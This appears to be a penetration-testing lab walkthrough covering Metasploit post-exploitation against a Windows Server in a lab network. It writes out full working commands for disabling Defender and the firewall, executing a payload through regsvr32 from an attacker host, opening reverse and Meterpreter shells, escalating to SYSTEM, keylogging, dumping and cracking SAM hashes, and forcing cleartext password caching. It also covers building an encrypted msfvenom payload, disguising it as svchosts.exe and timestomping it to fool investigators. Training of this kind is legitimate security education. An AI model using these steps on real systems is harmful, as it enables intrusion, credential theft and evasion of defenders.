In this lab, students will apply the concepts in the fourth video series called _Post-Exploitataton, Command-and-Control, and SOCKS proxying with Metasploit_ and perform the following tasks

- We will create malware using msfvenom
- Host the malware using Metasploit's "web_delivery" module and python "http.server" modules.
- Execute the malware on our Windows target to establish a reverse shell
- Upgrade our basic reverse shell to the versatile Meterpreter payload for command-and-control
- Use process migration to move to a more stable process that isn't likely to be closed by the victim.
- Use the Meterpreter to load additional functionality such as the Mimikatz
- Investigate manual and automatic privilege escalation opportunities
- Harvest credentials via dumping the local Security Account Manager (SAM) to retrieve password representations (hashes)
- Capture keystrokes to collect passwords
- Take screenshots
- Upload and download files
- Clear event logs
- Modify malware metadata to fool investigators
# Configure the Metasploit database

We configure the database in this lab because during post-exploitation, pentesters often compromise accounts, capture credentials and password representations (hashes), and storing them in the database keeps everything organized.

First login as _ROOT_ and create the file, using the following command:
`nano start_database.sh

Next, add the following commands to the file:

`service postgresql start msfdb reinit cp /usr/share/metasploit-framework/config/database.yml /root/.msf4/ service postgresql restart msfconsole`

Set the executable permission on the script and if the command is successful, run the database script.
`chmod +x start_database.sh && ./start_database.sh

Enable Metasploit console logging to capture all the input and output to the /root/console.log file by running the "spool" command along with the path and name of the file to save the output to.
`spool /root/console.log
# Configure the Windows Server

Navigate to the _Windows server machine_.

Next, we will make some changes to the Windows Server to make sure our Lab runs smoothly.

To log in as an administrator on Windows Server, click the Windows icon in the bottom left corner, then go to the user settings. Change the user to the _Administrator_ account and enter the default password, _123456_.

Check if _Windows Defender Anti-Virus_ is disabled.

Click on the Windows icon in the bottom left-hand corner and type _virus and threat protection_. Then, click on _Manage Settings_. Finally, click on _Real-time protection_ and turn it _OFF_ if needed.
Next, open _powershell.exe_.

To disable the Windows defender firewall, enter:
`netsh advfirewall set allprofiles state off

Next, let's set the windows _administrator_ password by typing the following command:
`net user Administrator Password12345
# Load the web_delivery module

Switch back to the _Kali VM machine_.

Since we will be creating some Windows 64-bit malware, we need a way to host it on the network and have the target machine download it. Metasploit has a useful module called the _web_delivery_ module that does just that.

Let's use the _web_delivery_ module _to host and deliver the malware_ on the network so the Windows target can access it.

Start by loading the module, by using the following command:
`use exploit/multi/script/web_delivery
### Configure the web_delivery module

Next, let's set the options for our _web_delivery_ module.
`set LHOST eth0

The URIPATH option is the URL that the victim will visit. If you set the URIPATH to _/admin/login/_ then the attacker would visit the URL` http://attacker.com/admin/login/`. Lets set this to / for now to keep things simple.
`set URIPATH /

Since the default payload does not work with the _web_delivery_ module, we will use a simple Windows reverse shell for now.
`set PAYLOAD windows/x64/shell/reverse_tcp

Next, let's take a look at the available TARGET options.
`show targets

Let's use the Regsvr32 target option to 3.
`set TARGET 3

`Regsvr32.exe` is often used by attackers and penetration testers to bypass application whitelisting, where only approved programs are permitted to run. Regsvr32.exe is an approved Microsoft binary and can be used to execute the code of an attacker's choosing.

Confirm you set the target correctly by typing _options_. It should list the target as Regsvr32.

Finally, type the following command to launch the module.
`run

> Verify the IP address configured for the listener.

What port does the module use to listen for incoming connections? **8080**
# Execute the malware on Windows

Navigate back to the _Windows Server machine_. We will use _regsvr32.exe_ to execute our malware because it is a signed Microsoft binary, and it's often used to bypass application whitelisting when a pentester is in an environment where only approved applications are permitted to run.

_Regsvr32.exe_ is used to proxy the execution of our (malicious) code by using the **_scrobj.dll_** to execute a custom COM scriptlet, which in this case is our metasploit code. The technique of using built-in tools to execute malicious code is called _living off the land_.

Open a powershell as administrator and type the following command:
`regsvr32 /s /n /u /i:http://192.168.1.101:8080/.sct scrobj.dll

> Verify that the IP address matches the listener's configured IP.

The _/s_ flag does not display any messages on the screen, the _/n_ flag prevents calling DllRegisterServer and is used in conjunction with the _/i_ flag, the _/u_ flag unregisters a server, and the _/i_ flag passes a command line argument to DLLInstall.

If you're interested in learning more about this "living off the land" attack technique, you can google **_Squiblydoo attack_** for more information.

Which DLL does Regsvr32.exe use to execute the scriptlet? `scrobj.dll`
# Confirm remote command shell acccess

Switch back to the _Kali VM machine_.

Let's check the output of the _web_delivery_ module.

When you see _Command shell session 1 opened_, the attack is successful, and you now have a _command-and-control (C2)_ session with the compromised system.

Press _ENTER_ to return to your prompt after the reverse connection is established.

Type _SESSIONS_ to view details about your current Metasploit session.
### Upgrade your shell to a Meterpreter

A reverse shell is useful, but let's upgrade it to a Meterpreter payload using Metasploit.

Run the command (where 1 is the current session ID) to upgrade the reverse shell to a more powerful Meterpreter payload:
`sessions -u 1

Wait for _Meterpreter session 2 opened_ to confirm the upgrade, then you're good to go.

Since we've upgraded the reverse shell, a second session is created. Hit _enter_ and type _sessions_ to list all sessions.
`sessions

Select the new session by typing the following command:
`sessions -i 2

Use _sysinfo_ at the Meterpreter prompt to get basic info about the compromised host.
`sysinfo
![[Pasted image 20250815201039.png]]

What architecture is the Meterpreter session? `x64/windows`
# Privilege escalation options

There are numerous ways to escalate privileges once you have a Meterpreter command-and-control session established.

An attacker could use any of the following methods with the meterpreter to try and escalate privileges

1. Capture Keystrokes
2. Sniff the network for clear-text credentials
3. Use the "local_exploit_suggester" to enumerate the compromised system to check for security vulnerabilities
4. Use the "getsystem" command to automate the privilege escalation process.
5. Perform social engineering and trick the user into authenticating to our attacker machine, resulting in the NTLMv2 hash capture of the user's password or prompt the user for credentials.

Let's perform some of those privilege escalation tactics with built-in meterpreter functionality.

Begin by loading the **_local_exploit_suggester_** post-exploitation module to check if the compromised system is missing patches or vulnerable in some way that could allow for privilege escalation.
`run post/multi/recon/local_exploit_suggester

Based on the output, It looks like this Windows Server system may be vulnerable to CVE_2024_30088 and CVE_2024_35250 security issues. You can google or search Metasploit to see if an exploit exists.

Background your existing meterpreter session by typing _background_ and then search for the cve_2024_30088 exploit.
`background
`search 2024_30088

Now, we can switch back to your meterpreter session by typing:
`sessions -i 2

Then type _getsystem_ to attempt to automatically escalate your privileges.
`getsystem

Let's confirm by checking our integrity level now that we have elevated our privileges.
`getuid
![[Pasted image 20250815201257.png]]

What user is displayed in the output? `NT AUTHORITY\SYSTEM`
# Capture keystrokes and passwords

Sometimes, capturing keystrokes from the logged-on user can be a highly effective method for _collecting sensitive data_ such usernames, passwords, and other data for privilege escalation or lateral movement.

Metasploit provides a built-in feature to capture keystrokes and store them in a file using the _keyscan_ commands.

To enable the keystroke logger, type:
`keyscan_start`

> SWITCH TO YOUR WINDOWS MACHINE

Lets use Secure Shell to log into another system called 192.168.1.100 to demonstrate the power of the Meterpreters key stroke logging functionality.
In powershell, enter:

`ssh kali@192.168.1.100

When prompted for the password, enter:
`Passw0rd!

After logging in via SSH, you can type the following commands just to demonstrate that the keystroke logger can capture text even when logged into another system.
`pwd, ls, and whoami.

> SWITCH BACK TO YOUR _KALI SYSTEM_.

Next, let's dump the captured keystrokes from the Windows target to check and see if we successfully captured any credentials.
`keyscan_dump

When you are finished capturing keystrokes, stop the keystroke logger by typing:
`keyscan_stop
# Dump password hashes

Accessing credentials is a huge part of penetration testing. Pentesters need credentials to move laterally from system to system, and Metasploit has a couple of modules for this purpose.

Let's dump password hashes from the local Windows Security Account Manager (SAM) via the _hashdump_ module.
`run post/windows/gather/hashdump

Now that we have successfully extracted the password hashes (representations), let's confirm by backgrounding our session:
`background

and check the database by typing the following command:
`creds

### Cracking Plaintext Password

After retrieving the NTLM hashes, we can use _hashcat_ or _john_ to crack them offline using a brute force or directory attack.

Copy the NTLM hash associated with the _Administrator_ account from the output, and open a _new terminal_.

Create a file to store the hash:
`nano hashes.txt

Paste the copied _Administrator_ hash into the file:

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:9bff06fe611486579fb74037890fda96:::

Now, run the hashcat using a metasploit wordlist:
`hashcat -m 1000 -a 0 hashes.txt /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

The _-m_ option specifies the hash type, the _-a_ specifies a dictionary attack mode.

After a few attempts, hashcat may successfully find and display the plaintext password for the Administrator.

When using hashcat to crack NTLM hashes, what does the _-m 1000_ option specify? **Hash type of NTLM**
# Select the wdigest_caching module

> Navigate back to the first terminal.

Next, we will use another module called wdigest_caching. To launch it, use the following command:
`use wdigest_caching

We will only need to set the SESSION value to our existing meterpreter session, session ID 2.
`set SESSION 2

Finally, modify the registry and enable wdigest on the compromised Windows system.
`run

As you can see from the output, we have added a new registry with a value of 1. This turns on wdigest.

The next time a user logs in to the console or over the network, the credentials will be saved in CLEAR TEXT and we can use **Mimikatz** to extract them :)

Instead of waiting for someone to log in, let's lock the user's workstation and force them to type the Administrator password to unlock it in the next step.

What registry entry was added? `UserLogonCredential`
# Lock workstation and capture the Admin password

Lets get back into our meterpreter session by typing _sessions -i 2_ so we can lock the windows workstation to force the user to unlock it.

When the user types his password, wdigest saves the password IN CLEAR TEXT IN MEMORY.
`sessions -i 2

Type, `shell` to use the `cmd.exe` command shell.

Next, lets use the rundll32.exe application to lock the users workstation.
`rundll32 user32.dll, LockWorkStation

Afterward, the windows are now locked, and when the user tries to enter their password, the wdist tool captures the password in clear text.
### Grab a screenshot

If you have control over a machine where the user is logged in and using the Windows GUI, it can be useful to see what they're doing. Metasploit has a "screenshot" module that allows you to grab a screenshot and open it automatically in Firefox.

Exit the Windows command prompt by typing:
`exit`

To take a screenshot and view it in Firefox, first load the espia module:
`use espia

Then, capture the screenshot using:
`screengrab

This command captures a screenshot, saves it with a random name and a .jpeg extension in the current working directory, and automatically opens it in Firefox.

Which Windows executable is used to lock the workstation remotely? `rundll32`
# Create Windows malware via msfvenom

Let's create some malware using msfvenom, which is an integral part of the Metasploit Framework as it allows a pentester to create malicious software for Windows, Linux, macOS etc.

Msfvenom also comes with features to evade anti-virus and other endpoint detection and response software often found on Windows endpoints.

First, we will need to background our current meterpreter session.
`background

To get a quick overwiew on msfvenom usage, type:
`msfvenom -h

Let's use msfvenom to create 64-bit Windows malware that will provide us with a meterpreter session for our target.
`msfvenom --payload windows/x64/meterpreter_reverse_tcp LHOST=eth0 LPORT=443 --encrypt rc4 --encrypt-key thisisakey --format exe > encrypted_meterpreter.exe

What is the significance of setting _--format exe_ in the msfvenom command? **It specifies the output format to be a windows executable file**
# Host the malware using python

Let's host the Windows malware using a simple python web server. Use the following command to start a basic web server, listening on port 443 that will serve up our malware to anyone who connects.
`python3 -m http.server 443 &

### Upload the malware via the Meterpreter

Let's upload the Windows malware we created using the built-in file upload functionality in the meterpreter.

First lets interact with our existing meterpreter session by typing:
`sessions -i 2

Next, type the _pwd_ command to figure out our Present Working Directory.
`pwd

Then, upload the Windows malware via the _upload_ command to a writeable directory on the windows system. _c:\windows\temp_ seems like a good choice.
`upload encrypted_meterpreter.exe c:\\windows\\temp

### Move, Rename & change the MACE values

Since we added a new malicious file to the compromised Windows system, let's move, rename it, and use the "timestomp" command to modify the MACE values. MACE stands for Modified, Accessed, Created, and Entry timestamps, and modifying these can help avoid detection by making the file appear older than it really is.

First, let's list the details of the file we just uploaded by running:
`ls c:\\windows\\temp\\encrypted_meterpreter.exe

Next, let's move and rename the file to make it blend in with legitimate Windows utilities. We'll use the "mv" command to rename the file and place it in the c:\windows\system32\ directory, where executable files are commonly found.

Run this command:
`mv c:\\windows\\temp\\encrypted_meterpreter.exe c:\\windows\\system32\\svchosts.exe

Now, let's use the _timestomp_ command to modify the MACE attributes _Modified, Accessed, Created, and Entry_ to make the file appear older than it is. This helps to avoid detection from security teams.

Run this command to set the timestamps to a past date:
`timestomp c:\\windows\\system32\\svchosts.exe -z "01/28/2025 05:21:44"

Finally, confirm the changes to the MACE attributes by running the _ls_ command:
`ls c:\\windows\\system32\\svchosts.exe

You should now see the date and time on the file showing as 2025-01-28 at 5:21:44 AM, making it appear much older than the actual creation time.

What does the MACE attribute stand for in file systems?